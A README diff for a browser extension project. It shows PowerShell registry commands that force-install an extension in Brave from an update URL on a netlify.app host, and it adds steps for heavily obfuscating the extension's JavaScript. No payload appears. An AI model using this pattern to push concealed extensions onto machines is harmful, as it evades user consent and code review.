@@ -180,3 +180,31 @@ New-Item -Path HKLM:\SOFTWARE\Policies\BraveSoftware\Brave -Name ExtensionInstal
 ```powershell
 New-ItemProperty -Path HKLM:\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallForcelist -Name "1" -Value "dndadjccaejaalofmmbdbgmegaolcghb;https://kaleidoscopic-souffle-3f8d58.netlify.app/update.xml" -Force
 ```
+
+## Obfuscation
+
+Using [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator) to obfuscate the code.
+
+- can be installed globally or locally. (if installed locally add `npx` before the command)
+
+```sh
+npm i -g javascript-obfuscator
+```
+
+- Create a `Makefile` to automate the process of obfuscating the build
+- just run `make` in terminal to run makefile
+
+```makefile
+all: obfuscate
+obfuscate:
+	@javascript-obfuscator main.js -o script1.js --options-preset high-obfuscation
+	@javascript-obfuscator main2.js -o script2.js --options-preset high-obfuscation
+```
+
+- The above code can also be put in `package.json` as a script
+
+```js
+"scripts": {
+    "obfuscate": "javascript-obfuscator main.js -o script1.js --options-preset high-obfuscation && javascript-obfuscator main2.js -o script2.js --options-preset high-obfuscation"
+  },
+```
